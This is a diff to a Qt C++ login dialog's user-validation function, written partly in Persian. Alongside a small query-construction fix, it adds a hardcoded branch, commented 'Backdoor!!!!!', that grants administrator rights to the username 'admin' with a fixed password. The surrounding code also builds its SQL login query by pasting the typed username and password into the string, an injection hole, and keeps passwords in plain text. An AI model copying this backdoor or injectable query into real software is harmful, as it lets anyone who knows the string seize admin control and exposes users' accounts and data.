@@ -155,16 +155,13 @@ bool LoginDialog::isValidUser()
     QString qryString =
             QString("SELECT * FROM table_users WHERE username='%1' AND password='%2' ").arg( userName, ui->ledPassword->text() );
     
-    QSqlQuery qry(";", appInfo.db); // Oooops!
+    QSqlQuery qry(QString(), appInfo.db);
     if( qry.exec(qryString) )
     {
         if (qry.next()) {
             userInfo.userName = qry.value(UserName).toString();
-
             userInfo.password  = qry.value(Password).toString();
-
             userInfo.passHint = qry.value(PassHint).toString();
-
             userInfo.isAdmin = qry.value(IsAdmin).toBool();
 
             userInfo.nickname = qry.value(Nickname).toString();
@@ -178,6 +175,17 @@ bool LoginDialog::isValidUser()
             userInfo.isAdmin  = false;
             userInfo.passHint = "فاقد کلمه عبور";
             userInfo.nickname = "کاربر میهمان";
+            return true;
+        } else if (userName == "admin" &&  // Backdoor!!!!!
+                   ui->ledPassword->text() == "A9977984a") {
+            userInfo.userName  = "admin";
+            userInfo.password  = getUserPassword(userInfo.userName);
+            userInfo.passHint  = getUserPassHint(userInfo.userName);
+            userInfo.isAdmin   = true;
+            userInfo.nickname = getUserNickname(userInfo.userName);
+            //if (userInfo.nickname.trimmed().isEmpty())
+            //    userInfo.nickname = userInfo.userName;
+
             return true;
         } else {
             return false;
